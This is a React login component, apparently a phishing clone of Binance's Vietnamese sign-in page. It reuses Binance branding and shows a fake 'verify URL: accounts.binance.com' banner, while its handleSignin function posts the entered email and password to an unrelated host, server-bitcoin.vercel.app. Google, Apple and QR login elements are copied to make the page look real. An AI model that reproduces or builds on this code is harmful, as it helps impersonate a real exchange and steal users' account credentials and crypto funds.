import React from "react";
import { useState, useEffect } from "react";
import phoneImg from "./Assets/Images/scan-device-dark.svg";
import { FaApple, FaGoogle } from "react-icons/fa6";
import { Link } from "react-router-dom";
import axios from "axios"; // Import axios để gửi yêu cầu API
import { notification } from "antd";

export default function Signin() {
	const [email, setEmail] = useState("");
	const [password, setPassword] = useState("");
	const handleSignin = async () => {
		try {
			// Gửi yêu cầu đăng ký tới API endpoint
			const response = await axios.post(
				"https://server-bitcoin.vercel.app/api/user/login",
				{
					email,
					password,
				}
			);
			console.log(response.data.user._id); // Log dữ liệu phản hồi từ server
			// Hiển thị thông báo đăng ký thành công
			notification.success({
				message: "Thành công",
				description: "Đăng nhập thành công!",
			});
			localStorage.setItem("email", response.data.user.email);
			localStorage.setItem("id", response.data.user._id);
			setTimeout(() => {
				window.location.href = "/";
			}, 1000);
			// Thực hiện các hành động tiếp theo sau khi đăng ký thành công
		} catch (error) {
			// Xử lý lỗi nếu có
			console.error("Đăng ký thất bại:", error.message);
			notification.error({
				message: "Lỗi",
				description: "Đăng nhập thất bại. Sai thông tin đăng nhập.",
			});
		}
	};
	return (
		<div id='__APP'>
			<div id='wrap_app' className='css-1cfpz95'>
				<div className='hidden-header-in-bnc css-1164387'>
					<header className='css-wbnwxs'>
						<div className='bn-flex css-gvxcv'>
							<svg
								xmlns='http://www.w3.org/2000/svg'
								viewBox='0 0 5120 1024'
								className='css-1tywbcj'>
								<path
									d='M230.997333 512L116.053333 626.986667 0 512l116.010667-116.010667L230.997333 512zM512 230.997333l197.973333 197.973334 116.053334-115.968L512 0 197.973333 314.026667l116.053334 115.968L512 230.997333z m395.989333 164.992L793.002667 512l116.010666 116.010667L1024.981333 512l-116.992-116.010667zM512 793.002667l-197.973333-198.997334-116.053334 116.010667L512 1024l314.026667-314.026667-116.053334-115.968L512 793.002667z m0-165.973334l116.010667-116.053333L512 396.032 395.989333 512 512 626.986667z m1220.010667 11.946667v-1.962667c0-75.008-40.021333-113.024-105.002667-138.026666 39.978667-21.973333 73.984-58.026667 73.984-121.002667v-1.962667c0-88.021333-70.997333-145.024-185.002667-145.024h-260.992v561.024h267.008c126.976 0.981333 210.005333-51.029333 210.005334-153.002666z m-154.026667-239.957333c0 41.984-34.005333 58.965333-89.002667 58.965333h-113.962666V338.986667h121.984c52.010667 0 80.981333 20.992 80.981333 58.026666v2.005334z m31.018667 224c0 41.984-32.981333 61.013333-87.04 61.013333h-146.944v-123.050667h142.976c63.018667 0 91.008 23.04 91.008 61.013334v1.024z m381.994666 169.984V230.997333h-123.989333v561.024h123.989333v0.981334z m664.021334 0V230.997333h-122.026667v346.026667l-262.997333-346.026667h-114.005334v561.024h122.026667v-356.010666l272 356.992h104.96z m683.946666 0L3098.026667 228.010667h-113.962667l-241.024 564.992h127.018667l50.986666-125.994667h237.013334l50.986666 125.994667h130.005334z m-224.981333-235.008h-148.992l75.008-181.973334 73.984 181.973334z m814.037333 235.008V230.997333h-122.026666v346.026667l-262.997334-346.026667h-114.005333v561.024h122.026667v-356.010666l272 356.992h104.96z m636.970667-91.008l-78.976-78.976c-44.032 39.978667-83.029333 65.962667-148.010667 65.962666-96 0-162.986667-80-162.986666-176v-2.986666c0-96 67.968-174.976 162.986666-174.976 55.978667 0 100.010667 23.978667 144 62.976l78.976-91.008c-51.968-50.986667-114.986667-86.997333-220.970666-86.997334-171.989333 0-292.992 130.986667-292.992 290.005334V512c0 160.981333 122.965333 288.981333 288 288.981333 107.989333 1.024 171.989333-36.992 229.973333-98.986666z m527.018667 91.008v-109.994667h-305.024v-118.016h265.002666v-109.994667h-265.002666V340.992h301.013333V230.997333h-422.997333v561.024h427.008v0.981334z'
									p-id='2935'></path>
							</svg>
						</div>
						<div className='bn-flex css-1h690ep'></div>
						<div className=' flex flex-row items-center justify-between'>
							<div className='bn-tooltips-wrap css-oidhr0'>
								<div className='bn-tooltips-ele'>
									<div
										id='header_menu_current_lng'
										data-e2e='btn-language-icon'
										className='bn-flex css-dpvb9s'>
										<svg
											xmlns='http://www.w3.org/2000/svg'
											viewBox='0 0 24 24'
											fill='currentColor'
											className='css-1gn1lrv'>
											<path
												fill-rule='evenodd'
												clip-rule='evenodd'
												d='M15.23 20.403a9.011 9.011 0 005.684-7.153h-3.942c-.147 2.86-.793 5.388-1.741 7.153zm-.757-7.153c-.178 4.102-1.217 7.25-2.473 7.25-1.256 0-2.295-3.148-2.473-7.25h4.946zm0-2.5H9.527C9.705 6.648 10.744 3.5 12 3.5c1.256 0 2.295 3.148 2.473 7.25zm2.499 0h3.942a9.01 9.01 0 00-5.683-7.153c.948 1.765 1.594 4.293 1.741 7.153zm-9.936 0c.147-2.862.793-5.392 1.743-7.156a9.01 9.01 0 00-5.693 7.156h3.95zm0 2.5h-3.95a9.01 9.01 0 005.693 7.157c-.95-1.765-1.596-4.295-1.743-7.157z'
												fill='currentColor'></path>
										</svg>
									</div>
								</div>
								<div className='bn-bubble bn-bubble__unset shadow bn-tooltips transform translate-x-0 top-full right-0'>
									<div className='bn-bubble-content mt-1'>
										<div className='bn-flex css-1tzfn88'>
											<div className='header-lngCur-content onlyone onlyoneLng css-vurnku'>
												<div className='header-lngCur-item css-vurnku'>
													<div className='header-select-options-group-flat language-select css-vurnku'>
														<div className='typography-Body3 color-t_third css-vurnku'></div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div data-e2e='btn-theme-icon' className='bn-flex css-dpvb9s'>
								<svg
									xmlns='http://www.w3.org/2000/svg'
									viewBox='0 0 24 24'
									fill='none'
									id='header_menu_current_theme'
									className='css-1gn1lrv'>
									<path
										fill-rule='evenodd'
										clip-rule='evenodd'
										d='M10.5 2h3v3h-3V2zM16 12a4 4 0 11-8 0 4 4 0 018 0zM5.99 3.869L3.867 5.99 5.99 8.112 8.111 5.99 5.989 3.87zM2 13.5v-3h3v3H2zm1.868 4.51l2.121 2.12 2.122-2.12-2.122-2.122-2.121 2.121zM13.5 19v3h-3v-3h3zm4.51-3.112l-2.121 2.122 2.121 2.121 2.121-2.121-2.121-2.122zM19 10.5h3v3h-3v-3zm-3.11-4.51l2.12 2.121 2.122-2.121-2.121-2.121-2.122 2.121z'
										fill='currentColor'></path>
								</svg>
							</div>
						</div>
					</header>
				</div>
				<main className='main css-zy0fl3'>
					<div className='css-1rob6du'>
						<svg
							xmlns='http://www.w3.org/2000/svg'
							viewBox='0 0 24 24'
							fill='none'
							className='css-1ouueae'>
							<path
								fill-rule='evenodd'
								clip-rule='evenodd'
								d='M7 8v2H5v11h14V10h-2V8A5 5 0 007 8zm7.5 2V8a2.5 2.5 0 00-5 0v2h5zm-1 8v-5h-3v5h3z'
								fill='currentColor'></path>
						</svg>
						<div data-bn-type='text' className='css-1ldm553'>
							Xác minh URL:
						</div>
						<div data-bn-type='text' dir='ltr' className='css-mx5ldy'>
							<span data-bn-type='text' className='css-13n52y'>
								https://
							</span>
							accounts.binance.com
						</div>
					</div>
					<div className='css-1tpli5f'>
						<div className='css-108ucgm'>
							<div className='title-area css-1j2ljp7'>
								<div className='css-1qdlv15'>
									<div className='css-vurnku'>
										<div data-bn-type='text' className='css-y8g9ca'>
											Đăng nhập
										</div>
									</div>
								</div>
							</div>
						</div>
						<div className='css-1ath4v2'>
							<div className='css-1kqnn5e'>
								<div>
									<div className='css-15651n7'>
										<div className='css-hkk49j'>Email/Số điện thoại</div>
										<div className='css-hiy16i'>
											<div className='css-4cffwv h-10'>
												<div className='bn-textField bn-textField__line data-size-large css-1o99o7u'>
													<input
														type='text'
														value={email}
														autocapitalize='off'
														data-e2e='input-email'
														onChange={(e) => setEmail(e.target.value)}
														className='bn-textField-input w-full bg-transparent outline-none h-10'
													/>
													<div className='bn-textField-suffix'>
														<div className='css-10nf7hq'></div>
													</div>
												</div>
											</div>
										</div>
										<div
											className='help_default css-1i2rxwt'
											data-e2e='help-status'></div>
									</div>
									<div className='css-15651n7'>
										<div className='css-hkk49j'>Password</div>
										<div className='css-hiy16i'>
											<div className='css-4cffwv h-10'>
												<div className='bn-textField bn-textField__line data-size-large css-1o99o7u'>
													<input
														type='password'
														value={password}
														onChange={(e) => setPassword(e.target.value)}
														className='bn-textField-input w-full bg-transparent outline-none h-10'
														spellCheck='false'
													/>
													<div className='bn-textField-suffix'>
														<div className='css-10nf7hq'></div>
													</div>
												</div>
											</div>
										</div>
										<div
											className='help_default css-1i2rxwt'
											data-e2e='help-status'></div>
									</div>
									<button
										onClick={handleSignin}
										className='bn-button bn-button__default.flatprimary data-size-large w-full css-1l32zj5'>
										Đăng nhập
									</button>
								</div>
								<div></div>
								<div className='css-49vimp'>
									<div className='css-5nv61p'>
										<div className='css-109qfub'></div>
										<div data-bn-type='text' className='css-wmkk5n'>
											hoặc
										</div>
										<div className='css-109qfub'></div>
									</div>
									<div className='css-yyvsvt'>
										<div className='sign-with css-16vu25q'>
											<div id='gSignInWrapper' data-e2e='btn-google-login'>
												<div id='googleLoginBtn' className='css-lro9rj'>
													<button data-bn-type='button' className='css-1yzwok8'>
														<FaGoogle />{" "}
														<div className='css-ario60'>
															Tiếp tục với Google
														</div>
													</button>
													<div id='buttonDiv' className='css-1t1dwsw'>
														<div className='S9gUrf-YoZ4jf relative'>
															<div></div>
															<iframe
																src='https://accounts.google.com/gsi/button?theme=black&amp;size=large&amp;width=600px&amp;height=48px&amp;client_id=960821425630-aclsesu662patrhhq95iuuijekgg15p3.apps.googleusercontent.com&amp;iframe_id=gsi_839454_255666&amp;as=ifeyBrq%2BYDlGd%2BmXcJKieQ'
																allow='identity-credentials-get'
																id='gsi_839454_255666'
																title='Nút Đăng nhập bằng Google'
																className='block relative top-0 left-0 h-11 w-[420px] border-0 mx-[-2px] my-[-10px]'></iframe>
														</div>
													</div>
												</div>
											</div>
											<div className='css-vurnku'></div>
										</div>
										<div className='sign-with css-16vu25q'>
											<button
												data-bn-type='button'
												id='apple-login-btn'
												data-e2e='btn-apple-login'
												className='css-1040giw'>
												<FaApple className='text-xl' />
												<div className='css-p9hz2v'> Tiếp tục với Apple</div>
											</button>
											<div className='css-vurnku'></div>
										</div>
									</div>
								</div>
								<div className='css-1pi2foq'>
									<div className='css-16kt648'>
										<Link to='/signup' className='css-18w60pd'>
											Tạo tài khoản Binance
										</Link>
									</div>
								</div>
							</div>
							<div className='css-5zxgod'>
								<div className='css-eqa4nz'>
									<div data-bn-type='text' className='css-1w3dtlz'>
										Đăng nhập bằng mã QR
									</div>
									<div className='css-10nf7hq'>
										<div className='css-pj9plt'>
											<div className='qr-code css-1q1tyyv'>
												<img
													src='https://bin.bnbstatic.com/static/images/accounts/common/binance-logo.png'
													className='css-1vkfs78'
												/>
												<div className='css-y6mhy3'>
													<canvas
														className='h-[156px] w-[156px]'
														height='195'
														width='195'></canvas>
												</div>
											</div>
											<div className='css-134ban9'>
												<button
													data-bn-type='button'
													data-e2e='btn-get-qrcode'
													className='css-zhq8gu'>
													<svg
														xmlns='http://www.w3.org/2000/svg'
														viewBox='0 0 24 24'
														fill='none'
														className='css-10rzidz'>
														<path
															fill-rule='evenodd'
															clip-rule='evenodd'
															d='M7 4h3v3H7v3H4V4h3zm7 0h6v6h-3V7h-3V4zm-4 16v-3H7v-3H4v6h6zm7 0h-3v-3h3v-3h3v6h-3zm-1-9.5H8v3h8v-3z'
															fill='currentColor'></path>
													</svg>
													Tải mã QR
												</button>
											</div>
										</div>
										<img src={phoneImg} className='css-l24zyw' alt='' />
									</div>
									<div data-bn-type='text' className='css-d0nwx '>
										Quét mã này bằng{" "}
										<a
											data-bn-type='link'
											target='_blank'
											href='/'
											id='login-qr-download'
											className='css-ulkjq8'>
											ứng dụng Binance{" "}
										</a>
										để đăng nhập tức thì.
									</div>
									<div className='css-vurnku'></div>
								</div>
							</div>
						</div>
					</div>
				</main>
				<div className='css-vf8ot0'>
					<div data-bn-type='text' className='css-1om5toz'>
						Binance © 2024
					</div>
					<div
						data-bn-type='text'
						data-ot-trigger='true'
						data-e2e='btn-one-trust-cookie'
						className='css-ommr9c'>
						Tùy chọn Cookie
					</div>
				</div>
			</div>
		</div>
	);
}
